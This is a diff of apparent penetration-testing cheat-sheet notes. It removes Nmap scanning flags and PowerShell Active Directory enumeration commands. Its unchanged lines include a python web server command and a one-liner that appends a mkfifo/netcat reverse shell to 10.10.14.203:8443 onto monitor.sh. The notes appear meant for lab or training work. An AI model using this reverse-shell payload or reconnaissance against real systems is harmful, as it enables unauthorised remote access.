@@ -1,24 +1,3 @@
-#### Nmap
-
-Enumeration/Scanning:
-
-```bash
-nmap -sS IpAddress
-``` 
->[!note] Or use these flags
->```-sT``` for TCP or ```-sU``` for UDP.
-  
-Perform a quick scan for open ports followed by a full port scan
-
-```bash
-nmap -p0- -v -A -T4 IpAddress
-```
->[!note] What does each flag do?
->```-p0-``` asks Nmap to scan every possible TCP port.
->```-v``` asks Nmap to be verbose about it.
->```-A``` enables aggressive tests such as remote OS detection, service/version detection, and the Nmap Scripting Engine (NSE).
->```-T4``` enables a more aggressive timing policy to speed up the scan.
-
 #### Whatweb
 To list the plugins supported:
 ```bash
@@ -61,21 +40,4 @@ sudo python3 -m http.server 8080
 To add a line at the end of a file:
 ```bash
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.203 8443 >/tmp/f' | tee -a monitor.sh
-```
-
-## PowerShell useful commands
-
-Check user rights and of a user on an endpoint:
-```powershell
-whoami /priv
-```
-
-Get group details:
-```powershell
-Get-ADGroup -Identity "Server Operators" -Properties *
-```
-
-Domain admins group membership:
-```powershell
-Get-ADGroup -Identity "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members
 ```
